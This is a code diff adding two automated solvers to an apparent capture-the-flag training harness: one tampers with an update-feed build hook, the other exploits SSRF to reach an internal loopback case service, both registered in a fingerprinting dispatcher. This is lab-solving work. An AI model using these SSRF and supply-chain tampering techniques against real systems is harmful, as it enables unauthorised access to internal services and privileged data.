@@ -1274,6 +1274,59 @@ def solve_unlogged_breach(target_url: str) -> str:
     raise WebHandlerError("Unlogged breach audit comparison did not yield proof")
 
 
+def solve_tampered_build(target_url: str) -> str:
+    """Solve tampered build hook / supply-chain update challenge (Day 26 curriculum)."""
+    base = target_url.rstrip("/")
+    import json, copy
+    s, clues_raw, _ = _request(f"{base}/api/clues")
+    feat = "/inspect"
+    feed_route = "/api/updates"
+    if s == 200:
+        try:
+            clues = json.loads(clues_raw)
+            feat = clues.get("feature_route", feat)
+            feed_route = clues.get("update_feed", feed_route)
+        except Exception:
+            pass
+    s, feed_raw, _ = _request(f"{base}{feed_route}")
+    feed_obj = json.loads(feed_raw)["updates"][0]
+    payload = copy.deepcopy(feed_obj)
+    if isinstance(payload.get("artifact"), dict):
+        payload["artifact"]["hook"] = "privileged_export"
+    s, b, h = _request(f"{base}{feat}", method="POST", data=json.dumps(payload).encode("utf-8"), headers={"Content-Type": "application/json"})
+    proof = _extract_proof(b, h)
+    if proof:
+        return proof
+    raise WebHandlerError("Tampered build update did not yield proof")
+
+
+def solve_ssrf_internal(target_url: str) -> str:
+    """Solve SSRF to internal loopback case directory service (Day 27 curriculum)."""
+    base = target_url.rstrip("/")
+    import json, urllib.parse
+    s, clues_raw, _ = _request(f"{base}/api/clues")
+    feat = "/submit"
+    if s == 200:
+        try:
+            clues = json.loads(clues_raw)
+            feat = clues.get("feature_route", feat)
+        except Exception:
+            pass
+    s, cases_raw, _ = _request(f"{base}/api/cases")
+    cases = json.loads(cases_raw).get("cases", [])
+    exec_id = next((x["id"] for x in cases if x.get("owner") == "executive"), cases[-1]["id"])
+    s, topo_raw, _ = _request(f"{base}/api/topology")
+    topo = json.loads(topo_raw)
+    cs = topo.get("case_service", "http://127.0.0.1:8080/status")
+    ssrf_target = f"{cs}?id={exec_id}"
+    q = urllib.parse.quote(ssrf_target)
+    s, b, h = _request(f"{base}{feat}?target={q}")
+    proof = _extract_proof(b, h)
+    if proof:
+        return proof
+    raise WebHandlerError("Internal case SSRF did not yield proof")
+
+
 # ---------------------------------------------------------------------------
 # Handler Registry & Dynamic Dispatcher
 # ---------------------------------------------------------------------------
@@ -1303,6 +1356,8 @@ CURRICULUM_HANDLERS: dict[int, Callable[[str], str]] = {
     23: solve_proxy_header,
     24: solve_fail_open_policy,
     25: solve_unlogged_breach,
+    26: solve_tampered_build,
+    27: solve_ssrf_internal,
 }
 
 
@@ -1337,6 +1392,18 @@ def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
             if framework == "Slim" and ("audit" in clues_body or "export" in clues_body):
                 try:
                     return solve_unlogged_breach(target_url)
+                except Exception:
+                    pass
+
+            if "update_feed" in clues or "/api/updates" in clues_body or framework == "Fiber":
+                try:
+                    return solve_tampered_build(target_url)
+                except Exception:
+                    pass
+
+            if "case_directory_route" in clues or "topology_route" in clues or framework == "Ktor":
+                try:
+                    return solve_ssrf_internal(target_url)
                 except Exception:
                     pass
 
